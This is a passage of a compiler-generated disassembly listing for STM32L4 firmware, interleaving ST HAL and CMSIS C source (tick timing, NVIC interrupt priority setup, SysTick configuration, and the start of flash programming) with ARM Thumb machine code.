 8001148:	f000 f937 	bl	80013ba <HAL_NVIC_SetPriority>
        uwTickPrio = TickPriority;
 800114c:	4a0a      	ldr	r2, [pc, #40]	; (8001178 <HAL_InitTick+0x74>)
 800114e:	687b      	ldr	r3, [r7, #4]
 8001150:	6013      	str	r3, [r2, #0]
 8001152:	e007      	b.n	8001164 <HAL_InitTick+0x60>
      }
      else
      {
        status = HAL_ERROR;
 8001154:	2301      	movs	r3, #1
 8001156:	73fb      	strb	r3, [r7, #15]
 8001158:	e004      	b.n	8001164 <HAL_InitTick+0x60>
      }
    }
    else
    {
      status = HAL_ERROR;
 800115a:	2301      	movs	r3, #1
 800115c:	73fb      	strb	r3, [r7, #15]
 800115e:	e001      	b.n	8001164 <HAL_InitTick+0x60>
    }
  }
  else
  {
    status = HAL_ERROR;
 8001160:	2301      	movs	r3, #1
 8001162:	73fb      	strb	r3, [r7, #15]
  }

  /* Return function status */
  return status;
 8001164:	7bfb      	ldrb	r3, [r7, #15]
}
 8001166:	4618      	mov	r0, r3
 8001168:	3710      	adds	r7, #16
 800116a:	46bd      	mov	sp, r7
 800116c:	bd80      	pop	{r7, pc}
 800116e:	bf00      	nop
 8001170:	20000008 	.word	0x20000008
 8001174:	20000000 	.word	0x20000000
 8001178:	20000004 	.word	0x20000004

0800117c <HAL_IncTick>:
 * @note This function is declared as __weak to be overwritten in case of other
  *      implementations in user file.
  * @retval None
  */
__weak void HAL_IncTick(void)
{
 800117c:	b480      	push	{r7}
 800117e:	af00      	add	r7, sp, #0
  uwTick += (uint32_t)uwTickFreq;
 8001180:	4b06      	ldr	r3, [pc, #24]	; (800119c <HAL_IncTick+0x20>)
 8001182:	781b      	ldrb	r3, [r3, #0]
 8001184:	461a      	mov	r2, r3
 8001186:	4b06      	ldr	r3, [pc, #24]	; (80011a0 <HAL_IncTick+0x24>)
 8001188:	681b      	ldr	r3, [r3, #0]
 800118a:	4413      	add	r3, r2
 800118c:	4a04      	ldr	r2, [pc, #16]	; (80011a0 <HAL_IncTick+0x24>)
 800118e:	6013      	str	r3, [r2, #0]
}
 8001190:	bf00      	nop
 8001192:	46bd      	mov	sp, r7
 8001194:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001198:	4770      	bx	lr
 800119a:	bf00      	nop
 800119c:	20000008 	.word	0x20000008
 80011a0:	200003b8 	.word	0x200003b8

080011a4 <HAL_GetTick>:
  * @note This function is declared as __weak to be overwritten in case of other
  *       implementations in user file.
  * @retval tick value
  */
__weak uint32_t HAL_GetTick(void)
{
 80011a4:	b480      	push	{r7}
 80011a6:	af00      	add	r7, sp, #0
  return uwTick;
 80011a8:	4b03      	ldr	r3, [pc, #12]	; (80011b8 <HAL_GetTick+0x14>)
 80011aa:	681b      	ldr	r3, [r3, #0]
}
 80011ac:	4618      	mov	r0, r3
 80011ae:	46bd      	mov	sp, r7
 80011b0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80011b4:	4770      	bx	lr
 80011b6:	bf00      	nop
 80011b8:	200003b8 	.word	0x200003b8

080011bc <HAL_Delay>:
  *       implementations in user file.
  * @param Delay  specifies the delay time length, in milliseconds.
  * @retval None
  */
__weak void HAL_Delay(uint32_t Delay)
{
 80011bc:	b580      	push	{r7, lr}
 80011be:	b084      	sub	sp, #16
 80011c0:	af00      	add	r7, sp, #0
 80011c2:	6078      	str	r0, [r7, #4]
  uint32_t tickstart = HAL_GetTick();
 80011c4:	f7ff ffee 	bl	80011a4 <HAL_GetTick>
 80011c8:	60b8      	str	r0, [r7, #8]
  uint32_t wait = Delay;
 80011ca:	687b      	ldr	r3, [r7, #4]
 80011cc:	60fb      	str	r3, [r7, #12]

  /* Add a period to guaranty minimum wait */
  if (wait < HAL_MAX_DELAY)
 80011ce:	68fb      	ldr	r3, [r7, #12]
 80011d0:	f1b3 3fff 	cmp.w	r3, #4294967295
 80011d4:	d005      	beq.n	80011e2 <HAL_Delay+0x26>
  {
    wait += (uint32_t)uwTickFreq;
 80011d6:	4b0a      	ldr	r3, [pc, #40]	; (8001200 <HAL_Delay+0x44>)
 80011d8:	781b      	ldrb	r3, [r3, #0]
 80011da:	461a      	mov	r2, r3
 80011dc:	68fb      	ldr	r3, [r7, #12]
 80011de:	4413      	add	r3, r2
 80011e0:	60fb      	str	r3, [r7, #12]
  }

  while ((HAL_GetTick() - tickstart) < wait)
 80011e2:	bf00      	nop
 80011e4:	f7ff ffde 	bl	80011a4 <HAL_GetTick>
 80011e8:	4602      	mov	r2, r0
 80011ea:	68bb      	ldr	r3, [r7, #8]
 80011ec:	1ad3      	subs	r3, r2, r3
 80011ee:	68fa      	ldr	r2, [r7, #12]
 80011f0:	429a      	cmp	r2, r3
 80011f2:	d8f7      	bhi.n	80011e4 <HAL_Delay+0x28>
  {
  }
}
 80011f4:	bf00      	nop
 80011f6:	bf00      	nop
 80011f8:	3710      	adds	r7, #16
 80011fa:	46bd      	mov	sp, r7
 80011fc:	bd80      	pop	{r7, pc}
 80011fe:	bf00      	nop
 8001200:	20000008 	.word	0x20000008

08001204 <__NVIC_SetPriorityGrouping>:
           In case of a conflict between priority grouping and available
           priority bits (__NVIC_PRIO_BITS), the smallest possible priority group is set.
  \param [in]      PriorityGroup  Priority grouping field.
 */
__STATIC_INLINE void __NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 8001204:	b480      	push	{r7}
 8001206:	b085      	sub	sp, #20
 8001208:	af00      	add	r7, sp, #0
 800120a:	6078      	str	r0, [r7, #4]
  uint32_t reg_value;
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);             /* only values 0..7 are used          */
 800120c:	687b      	ldr	r3, [r7, #4]
 800120e:	f003 0307 	and.w	r3, r3, #7
 8001212:	60fb      	str	r3, [r7, #12]

  reg_value  =  SCB->AIRCR;                                                   /* read old register configuration    */
 8001214:	4b0c      	ldr	r3, [pc, #48]	; (8001248 <__NVIC_SetPriorityGrouping+0x44>)
 8001216:	68db      	ldr	r3, [r3, #12]
 8001218:	60bb      	str	r3, [r7, #8]
  reg_value &= ~((uint32_t)(SCB_AIRCR_VECTKEY_Msk | SCB_AIRCR_PRIGROUP_Msk)); /* clear bits to change               */
 800121a:	68ba      	ldr	r2, [r7, #8]
 800121c:	f64f 03ff 	movw	r3, #63743	; 0xf8ff
 8001220:	4013      	ands	r3, r2
 8001222:	60bb      	str	r3, [r7, #8]
  reg_value  =  (reg_value                                   |
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
                (PriorityGroupTmp << SCB_AIRCR_PRIGROUP_Pos)  );              /* Insert write key and priority group */
 8001224:	68fb      	ldr	r3, [r7, #12]
 8001226:	021a      	lsls	r2, r3, #8
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
 8001228:	68bb      	ldr	r3, [r7, #8]
 800122a:	4313      	orrs	r3, r2
  reg_value  =  (reg_value                                   |
 800122c:	f043 63bf 	orr.w	r3, r3, #100139008	; 0x5f80000
 8001230:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 8001234:	60bb      	str	r3, [r7, #8]
  SCB->AIRCR =  reg_value;
 8001236:	4a04      	ldr	r2, [pc, #16]	; (8001248 <__NVIC_SetPriorityGrouping+0x44>)
 8001238:	68bb      	ldr	r3, [r7, #8]
 800123a:	60d3      	str	r3, [r2, #12]
}
 800123c:	bf00      	nop
 800123e:	3714      	adds	r7, #20
 8001240:	46bd      	mov	sp, r7
 8001242:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001246:	4770      	bx	lr
 8001248:	e000ed00 	.word	0xe000ed00

0800124c <__NVIC_GetPriorityGrouping>:
  \brief   Get Priority Grouping
  \details Reads the priority grouping field from the NVIC Interrupt Controller.
  \return                Priority grouping field (SCB->AIRCR [10:8] PRIGROUP field).
 */
__STATIC_INLINE uint32_t __NVIC_GetPriorityGrouping(void)
{
 800124c:	b480      	push	{r7}
 800124e:	af00      	add	r7, sp, #0
  return ((uint32_t)((SCB->AIRCR & SCB_AIRCR_PRIGROUP_Msk) >> SCB_AIRCR_PRIGROUP_Pos));
 8001250:	4b04      	ldr	r3, [pc, #16]	; (8001264 <__NVIC_GetPriorityGrouping+0x18>)
 8001252:	68db      	ldr	r3, [r3, #12]
 8001254:	0a1b      	lsrs	r3, r3, #8
 8001256:	f003 0307 	and.w	r3, r3, #7
}
 800125a:	4618      	mov	r0, r3
 800125c:	46bd      	mov	sp, r7
 800125e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001262:	4770      	bx	lr
 8001264:	e000ed00 	.word	0xe000ed00

08001268 <__NVIC_EnableIRQ>:
  \details Enables a device specific interrupt in the NVIC interrupt controller.
  \param [in]      IRQn  Device specific interrupt number.
  \note    IRQn must not be negative.
 */
__STATIC_INLINE void __NVIC_EnableIRQ(IRQn_Type IRQn)
{
 8001268:	b480      	push	{r7}
 800126a:	b083      	sub	sp, #12
 800126c:	af00      	add	r7, sp, #0
 800126e:	4603      	mov	r3, r0
 8001270:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 8001272:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8001276:	2b00      	cmp	r3, #0
 8001278:	db0b      	blt.n	8001292 <__NVIC_EnableIRQ+0x2a>
  {
    __COMPILER_BARRIER();
    NVIC->ISER[(((uint32_t)IRQn) >> 5UL)] = (uint32_t)(1UL << (((uint32_t)IRQn) & 0x1FUL));
 800127a:	79fb      	ldrb	r3, [r7, #7]
 800127c:	f003 021f 	and.w	r2, r3, #31
 8001280:	4907      	ldr	r1, [pc, #28]	; (80012a0 <__NVIC_EnableIRQ+0x38>)
 8001282:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8001286:	095b      	lsrs	r3, r3, #5
 8001288:	2001      	movs	r0, #1
 800128a:	fa00 f202 	lsl.w	r2, r0, r2
 800128e:	f841 2023 	str.w	r2, [r1, r3, lsl #2]
    __COMPILER_BARRIER();
  }
}
 8001292:	bf00      	nop
 8001294:	370c      	adds	r7, #12
 8001296:	46bd      	mov	sp, r7
 8001298:	f85d 7b04 	ldr.w	r7, [sp], #4
 800129c:	4770      	bx	lr
 800129e:	bf00      	nop
 80012a0:	e000e100 	.word	0xe000e100

080012a4 <__NVIC_SetPriority>:
  \param [in]      IRQn  Interrupt number.
  \param [in]  priority  Priority to set.
  \note    The priority cannot be set for every processor exception.
 */
__STATIC_INLINE void __NVIC_SetPriority(IRQn_Type IRQn, uint32_t priority)
{
 80012a4:	b480      	push	{r7}
 80012a6:	b083      	sub	sp, #12
 80012a8:	af00      	add	r7, sp, #0
 80012aa:	4603      	mov	r3, r0
 80012ac:	6039      	str	r1, [r7, #0]
 80012ae:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 80012b0:	f997 3007 	ldrsb.w	r3, [r7, #7]
 80012b4:	2b00      	cmp	r3, #0
 80012b6:	db0a      	blt.n	80012ce <__NVIC_SetPriority+0x2a>
  {
    NVIC->IP[((uint32_t)IRQn)]               = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 80012b8:	683b      	ldr	r3, [r7, #0]
 80012ba:	b2da      	uxtb	r2, r3
 80012bc:	490c      	ldr	r1, [pc, #48]	; (80012f0 <__NVIC_SetPriority+0x4c>)
 80012be:	f997 3007 	ldrsb.w	r3, [r7, #7]
 80012c2:	0112      	lsls	r2, r2, #4
 80012c4:	b2d2      	uxtb	r2, r2
 80012c6:	440b      	add	r3, r1
 80012c8:	f883 2300 	strb.w	r2, [r3, #768]	; 0x300
  }
  else
  {
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
  }
}
 80012cc:	e00a      	b.n	80012e4 <__NVIC_SetPriority+0x40>
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 80012ce:	683b      	ldr	r3, [r7, #0]
 80012d0:	b2da      	uxtb	r2, r3
 80012d2:	4908      	ldr	r1, [pc, #32]	; (80012f4 <__NVIC_SetPriority+0x50>)
 80012d4:	79fb      	ldrb	r3, [r7, #7]
 80012d6:	f003 030f 	and.w	r3, r3, #15
 80012da:	3b04      	subs	r3, #4
 80012dc:	0112      	lsls	r2, r2, #4
 80012de:	b2d2      	uxtb	r2, r2
 80012e0:	440b      	add	r3, r1
 80012e2:	761a      	strb	r2, [r3, #24]
}
 80012e4:	bf00      	nop
 80012e6:	370c      	adds	r7, #12
 80012e8:	46bd      	mov	sp, r7
 80012ea:	f85d 7b04 	ldr.w	r7, [sp], #4
 80012ee:	4770      	bx	lr
 80012f0:	e000e100 	.word	0xe000e100
 80012f4:	e000ed00 	.word	0xe000ed00

080012f8 <NVIC_EncodePriority>:
  \param [in]   PreemptPriority  Preemptive priority value (starting from 0).
  \param [in]       SubPriority  Subpriority value (starting from 0).
  \return                        Encoded priority. Value can be used in the function \ref NVIC_SetPriority().
 */
__STATIC_INLINE uint32_t NVIC_EncodePriority (uint32_t PriorityGroup, uint32_t PreemptPriority, uint32_t SubPriority)
{
 80012f8:	b480      	push	{r7}
 80012fa:	b089      	sub	sp, #36	; 0x24
 80012fc:	af00      	add	r7, sp, #0
 80012fe:	60f8      	str	r0, [r7, #12]
 8001300:	60b9      	str	r1, [r7, #8]
 8001302:	607a      	str	r2, [r7, #4]
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);   /* only values 0..7 are used          */
 8001304:	68fb      	ldr	r3, [r7, #12]
 8001306:	f003 0307 	and.w	r3, r3, #7
 800130a:	61fb      	str	r3, [r7, #28]
  uint32_t PreemptPriorityBits;
  uint32_t SubPriorityBits;

  PreemptPriorityBits = ((7UL - PriorityGroupTmp) > (uint32_t)(__NVIC_PRIO_BITS)) ? (uint32_t)(__NVIC_PRIO_BITS) : (uint32_t)(7UL - PriorityGroupTmp);
 800130c:	69fb      	ldr	r3, [r7, #28]
 800130e:	f1c3 0307 	rsb	r3, r3, #7
 8001312:	2b04      	cmp	r3, #4
 8001314:	bf28      	it	cs
 8001316:	2304      	movcs	r3, #4
 8001318:	61bb      	str	r3, [r7, #24]
  SubPriorityBits     = ((PriorityGroupTmp + (uint32_t)(__NVIC_PRIO_BITS)) < (uint32_t)7UL) ? (uint32_t)0UL : (uint32_t)((PriorityGroupTmp - 7UL) + (uint32_t)(__NVIC_PRIO_BITS));
 800131a:	69fb      	ldr	r3, [r7, #28]
 800131c:	3304      	adds	r3, #4
 800131e:	2b06      	cmp	r3, #6
 8001320:	d902      	bls.n	8001328 <NVIC_EncodePriority+0x30>
 8001322:	69fb      	ldr	r3, [r7, #28]
 8001324:	3b03      	subs	r3, #3
 8001326:	e000      	b.n	800132a <NVIC_EncodePriority+0x32>
 8001328:	2300      	movs	r3, #0
 800132a:	617b      	str	r3, [r7, #20]

  return (
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 800132c:	f04f 32ff 	mov.w	r2, #4294967295
 8001330:	69bb      	ldr	r3, [r7, #24]
 8001332:	fa02 f303 	lsl.w	r3, r2, r3
 8001336:	43da      	mvns	r2, r3
 8001338:	68bb      	ldr	r3, [r7, #8]
 800133a:	401a      	ands	r2, r3
 800133c:	697b      	ldr	r3, [r7, #20]
 800133e:	409a      	lsls	r2, r3
           ((SubPriority     & (uint32_t)((1UL << (SubPriorityBits    )) - 1UL)))
 8001340:	f04f 31ff 	mov.w	r1, #4294967295
 8001344:	697b      	ldr	r3, [r7, #20]
 8001346:	fa01 f303 	lsl.w	r3, r1, r3
 800134a:	43d9      	mvns	r1, r3
 800134c:	687b      	ldr	r3, [r7, #4]
 800134e:	400b      	ands	r3, r1
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 8001350:	4313      	orrs	r3, r2
         );
}
 8001352:	4618      	mov	r0, r3
 8001354:	3724      	adds	r7, #36	; 0x24
 8001356:	46bd      	mov	sp, r7
 8001358:	f85d 7b04 	ldr.w	r7, [sp], #4
 800135c:	4770      	bx	lr
	...

08001360 <SysTick_Config>:
  \note    When the variable <b>__Vendor_SysTickConfig</b> is set to 1, then the
           function <b>SysTick_Config</b> is not included. In this case, the file <b><i>device</i>.h</b>
           must contain a vendor-specific implementation of this function.
 */
__STATIC_INLINE uint32_t SysTick_Config(uint32_t ticks)
{
 8001360:	b580      	push	{r7, lr}
 8001362:	b082      	sub	sp, #8
 8001364:	af00      	add	r7, sp, #0
 8001366:	6078      	str	r0, [r7, #4]
  if ((ticks - 1UL) > SysTick_LOAD_RELOAD_Msk)
 8001368:	687b      	ldr	r3, [r7, #4]
 800136a:	3b01      	subs	r3, #1
 800136c:	f1b3 7f80 	cmp.w	r3, #16777216	; 0x1000000
 8001370:	d301      	bcc.n	8001376 <SysTick_Config+0x16>
  {
    return (1UL);                                                   /* Reload value impossible */
 8001372:	2301      	movs	r3, #1
 8001374:	e00f      	b.n	8001396 <SysTick_Config+0x36>
  }

  SysTick->LOAD  = (uint32_t)(ticks - 1UL);                         /* set reload register */
 8001376:	4a0a      	ldr	r2, [pc, #40]	; (80013a0 <SysTick_Config+0x40>)
 8001378:	687b      	ldr	r3, [r7, #4]
 800137a:	3b01      	subs	r3, #1
 800137c:	6053      	str	r3, [r2, #4]
  NVIC_SetPriority (SysTick_IRQn, (1UL << __NVIC_PRIO_BITS) - 1UL); /* set Priority for Systick Interrupt */
 800137e:	210f      	movs	r1, #15
 8001380:	f04f 30ff 	mov.w	r0, #4294967295
 8001384:	f7ff ff8e 	bl	80012a4 <__NVIC_SetPriority>
  SysTick->VAL   = 0UL;                                             /* Load the SysTick Counter Value */
 8001388:	4b05      	ldr	r3, [pc, #20]	; (80013a0 <SysTick_Config+0x40>)
 800138a:	2200      	movs	r2, #0
 800138c:	609a      	str	r2, [r3, #8]
  SysTick->CTRL  = SysTick_CTRL_CLKSOURCE_Msk |
 800138e:	4b04      	ldr	r3, [pc, #16]	; (80013a0 <SysTick_Config+0x40>)
 8001390:	2207      	movs	r2, #7
 8001392:	601a      	str	r2, [r3, #0]
                   SysTick_CTRL_TICKINT_Msk   |
                   SysTick_CTRL_ENABLE_Msk;                         /* Enable SysTick IRQ and SysTick Timer */
  return (0UL);                                                     /* Function successful */
 8001394:	2300      	movs	r3, #0
}
 8001396:	4618      	mov	r0, r3
 8001398:	3708      	adds	r7, #8
 800139a:	46bd      	mov	sp, r7
 800139c:	bd80      	pop	{r7, pc}
 800139e:	bf00      	nop
 80013a0:	e000e010 	.word	0xe000e010

080013a4 <HAL_NVIC_SetPriorityGrouping>:
  * @note   When the NVIC_PriorityGroup_0 is selected, IRQ pre-emption is no more possible.
  *         The pending IRQ priority will be managed only by the subpriority.
  * @retval None
  */
void HAL_NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 80013a4:	b580      	push	{r7, lr}
 80013a6:	b082      	sub	sp, #8
 80013a8:	af00      	add	r7, sp, #0
 80013aa:	6078      	str	r0, [r7, #4]
  /* Check the parameters */
  assert_param(IS_NVIC_PRIORITY_GROUP(PriorityGroup));

  /* Set the PRIGROUP[10:8] bits according to the PriorityGroup parameter value */
  NVIC_SetPriorityGrouping(PriorityGroup);
 80013ac:	6878      	ldr	r0, [r7, #4]
 80013ae:	f7ff ff29 	bl	8001204 <__NVIC_SetPriorityGrouping>
}
 80013b2:	bf00      	nop
 80013b4:	3708      	adds	r7, #8
 80013b6:	46bd      	mov	sp, r7
 80013b8:	bd80      	pop	{r7, pc}

080013ba <HAL_NVIC_SetPriority>:
  *         This parameter can be a value between 0 and 15
  *         A lower priority value indicates a higher priority.
  * @retval None
  */
void HAL_NVIC_SetPriority(IRQn_Type IRQn, uint32_t PreemptPriority, uint32_t SubPriority)
{
 80013ba:	b580      	push	{r7, lr}
 80013bc:	b086      	sub	sp, #24
 80013be:	af00      	add	r7, sp, #0
 80013c0:	4603      	mov	r3, r0
 80013c2:	60b9      	str	r1, [r7, #8]
 80013c4:	607a      	str	r2, [r7, #4]
 80013c6:	73fb      	strb	r3, [r7, #15]
  uint32_t prioritygroup = 0x00;
 80013c8:	2300      	movs	r3, #0
 80013ca:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_NVIC_SUB_PRIORITY(SubPriority));
  assert_param(IS_NVIC_PREEMPTION_PRIORITY(PreemptPriority));

  prioritygroup = NVIC_GetPriorityGrouping();
 80013cc:	f7ff ff3e 	bl	800124c <__NVIC_GetPriorityGrouping>
 80013d0:	6178      	str	r0, [r7, #20]

  NVIC_SetPriority(IRQn, NVIC_EncodePriority(prioritygroup, PreemptPriority, SubPriority));
 80013d2:	687a      	ldr	r2, [r7, #4]
 80013d4:	68b9      	ldr	r1, [r7, #8]
 80013d6:	6978      	ldr	r0, [r7, #20]
 80013d8:	f7ff ff8e 	bl	80012f8 <NVIC_EncodePriority>
 80013dc:	4602      	mov	r2, r0
 80013de:	f997 300f 	ldrsb.w	r3, [r7, #15]
 80013e2:	4611      	mov	r1, r2
 80013e4:	4618      	mov	r0, r3
 80013e6:	f7ff ff5d 	bl	80012a4 <__NVIC_SetPriority>
}
 80013ea:	bf00      	nop
 80013ec:	3718      	adds	r7, #24
 80013ee:	46bd      	mov	sp, r7
 80013f0:	bd80      	pop	{r7, pc}

080013f2 <HAL_NVIC_EnableIRQ>:
  *         This parameter can be an enumerator of IRQn_Type enumeration
  *         (For the complete STM32 Devices IRQ Channels list, please refer to the appropriate CMSIS device file (stm32l4xxxx.h))
  * @retval None
  */
void HAL_NVIC_EnableIRQ(IRQn_Type IRQn)
{
 80013f2:	b580      	push	{r7, lr}
 80013f4:	b082      	sub	sp, #8
 80013f6:	af00      	add	r7, sp, #0
 80013f8:	4603      	mov	r3, r0
 80013fa:	71fb      	strb	r3, [r7, #7]
  /* Check the parameters */
  assert_param(IS_NVIC_DEVICE_IRQ(IRQn));
  
  /* Enable interrupt */
  NVIC_EnableIRQ(IRQn);
 80013fc:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8001400:	4618      	mov	r0, r3
 8001402:	f7ff ff31 	bl	8001268 <__NVIC_EnableIRQ>
}
 8001406:	bf00      	nop
 8001408:	3708      	adds	r7, #8
 800140a:	46bd      	mov	sp, r7
 800140c:	bd80      	pop	{r7, pc}

0800140e <HAL_SYSTICK_Config>:
  * @param  TicksNumb: Specifies the ticks Number of ticks between two interrupts.
  * @retval status:  - 0  Function succeeded.
  *                  - 1  Function failed.
  */
uint32_t HAL_SYSTICK_Config(uint32_t TicksNumb)
{
 800140e:	b580      	push	{r7, lr}
 8001410:	b082      	sub	sp, #8
 8001412:	af00      	add	r7, sp, #0
 8001414:	6078      	str	r0, [r7, #4]
   return SysTick_Config(TicksNumb);
 8001416:	6878      	ldr	r0, [r7, #4]
 8001418:	f7ff ffa2 	bl	8001360 <SysTick_Config>
 800141c:	4603      	mov	r3, r0
}
 800141e:	4618      	mov	r0, r3
 8001420:	3708      	adds	r7, #8
 8001422:	46bd      	mov	sp, r7
 8001424:	bd80      	pop	{r7, pc}
	...

08001428 <HAL_FLASH_Program>:
  *                are stored the data for the row fast program
  *
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Program(uint32_t TypeProgram, uint32_t Address, uint64_t Data)
{
 8001428:	b580      	push	{r7, lr}
 800142a:	b086      	sub	sp, #24
 800142c:	af00      	add	r7, sp, #0
 800142e:	60f8      	str	r0, [r7, #12]
 8001430:	60b9      	str	r1, [r7, #8]
 8001432:	e9c7 2300 	strd	r2, r3, [r7]
  HAL_StatusTypeDef status;
  uint32_t prog_bit = 0;
 8001436:	2300      	movs	r3, #0
 8001438:	613b      	str	r3, [r7, #16]

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 800143a:	4b2f      	ldr	r3, [pc, #188]	; (80014f8 <HAL_FLASH_Program+0xd0>)
 800143c:	781b      	ldrb	r3, [r3, #0]
 800143e:	2b01      	cmp	r3, #1
 8001440:	d101      	bne.n	8001446 <HAL_FLASH_Program+0x1e>
 8001442:	2302      	movs	r3, #2
 8001444:	e053      	b.n	80014ee <HAL_FLASH_Program+0xc6>
 8001446:	4b2c      	ldr	r3, [pc, #176]	; (80014f8 <HAL_FLASH_Program+0xd0>)
 8001448:	2201      	movs	r2, #1
 800144a:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEPROGRAM(TypeProgram));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 800144c:	f24c 3050 	movw	r0, #50000	; 0xc350
 8001450:	f000 f888 	bl	8001564 <FLASH_WaitForLastOperation>
 8001454:	4603      	mov	r3, r0
 8001456:	75fb      	strb	r3, [r7, #23]

  if(status == HAL_OK)
 8001458:	7dfb      	ldrb	r3, [r7, #23]
 800145a:	2b00      	cmp	r3, #0
 800145c:	d143      	bne.n	80014e6 <HAL_FLASH_Program+0xbe>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 800145e:	4b26      	ldr	r3, [pc, #152]	; (80014f8 <HAL_FLASH_Program+0xd0>)
 8001460:	2200      	movs	r2, #0
 8001462:	605a      	str	r2, [r3, #4]

    /* Deactivate the data cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 8001464:	4b25      	ldr	r3, [pc, #148]	; (80014fc <HAL_FLASH_Program+0xd4>)
 8001466:	681b      	ldr	r3, [r3, #0]
 8001468:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 800146c:	2b00      	cmp	r3, #0
 800146e:	d009      	beq.n	8001484 <HAL_FLASH_Program+0x5c>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 8001470:	4b22      	ldr	r3, [pc, #136]	; (80014fc <HAL_FLASH_Program+0xd4>)
 8001472:	681b      	ldr	r3, [r3, #0]
 8001474:	4a21      	ldr	r2, [pc, #132]	; (80014fc <HAL_FLASH_Program+0xd4>)
 8001476:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 800147a:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 800147c:	4b1e      	ldr	r3, [pc, #120]	; (80014f8 <HAL_FLASH_Program+0xd0>)
 800147e:	2202      	movs	r2, #2
 8001480:	771a      	strb	r2, [r3, #28]
 8001482:	e002      	b.n	800148a <HAL_FLASH_Program+0x62>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 8001484:	4b1c      	ldr	r3, [pc, #112]	; (80014f8 <HAL_FLASH_Program+0xd0>)
 8001486:	2200      	movs	r2, #0
 8001488:	771a      	strb	r2, [r3, #28]
    }

    if(TypeProgram == FLASH_TYPEPROGRAM_DOUBLEWORD)
 800148a:	68fb      	ldr	r3, [r7, #12]
 800148c:	2b00      	cmp	r3, #0
 800148e:	d107      	bne.n	80014a0 <HAL_FLASH_Program+0x78>
    {
      /* Program double-word (64-bit) at a specified address */
      FLASH_Program_DoubleWord(Address, Data);
 8001490:	e9d7 2300 	ldrd	r2, r3, [r7]
 8001494:	68b8      	ldr	r0, [r7, #8]
 8001496:	f000 f8bd 	bl	8001614 <FLASH_Program_DoubleWord>
      prog_bit = FLASH_CR_PG;
 800149a:	2301      	movs	r3, #1
 800149c:	613b      	str	r3, [r7, #16]
 800149e:	e010      	b.n	80014c2 <HAL_FLASH_Program+0x9a>
    }
    else if((TypeProgram == FLASH_TYPEPROGRAM_FAST) || (TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST))
 80014a0:	68fb      	ldr	r3, [r7, #12]
 80014a2:	2b01      	cmp	r3, #1
 80014a4:	d002      	beq.n	80014ac <HAL_FLASH_Program+0x84>
 80014a6:	68fb      	ldr	r3, [r7, #12]
 80014a8:	2b02      	cmp	r3, #2
 80014aa:	d10a      	bne.n	80014c2 <HAL_FLASH_Program+0x9a>
    {
      /* Fast program a 32 row double-word (64-bit) at a specified address */
      FLASH_Program_Fast(Address, (uint32_t)Data);
 80014ac:	683b      	ldr	r3, [r7, #0]
 80014ae:	4619      	mov	r1, r3
 80014b0:	68b8      	ldr	r0, [r7, #8]
 80014b2:	f000 f8d5 	bl	8001660 <FLASH_Program_Fast>

      /* If it is the last row, the bit will be cleared at the end of the operation */
      if(TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST)
 80014b6:	68fb      	ldr	r3, [r7, #12]
 80014b8:	2b02      	cmp	r3, #2
 80014ba:	d102      	bne.n	80014c2 <HAL_FLASH_Program+0x9a>
      {
        prog_bit = FLASH_CR_FSTPG;
 80014bc:	f44f 2380 	mov.w	r3, #262144	; 0x40000
 80014c0:	613b      	str	r3, [r7, #16]
    {
      /* Nothing to do */
    }

    /* Wait for last operation to be completed */
    status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 80014c2:	f24c 3050 	movw	r0, #50000	; 0xc350
 80014c6:	f000 f84d 	bl	8001564 <FLASH_WaitForLastOperation>
 80014ca:	4603      	mov	r3, r0
 80014cc:	75fb      	strb	r3, [r7, #23]

    /* If the program operation is completed, disable the PG or FSTPG Bit */
    if (prog_bit != 0U)
 80014ce:	693b      	ldr	r3, [r7, #16]
 80014d0:	2b00      	cmp	r3, #0
 80014d2:	d006      	beq.n	80014e2 <HAL_FLASH_Program+0xba>
    {
      CLEAR_BIT(FLASH->CR, prog_bit);
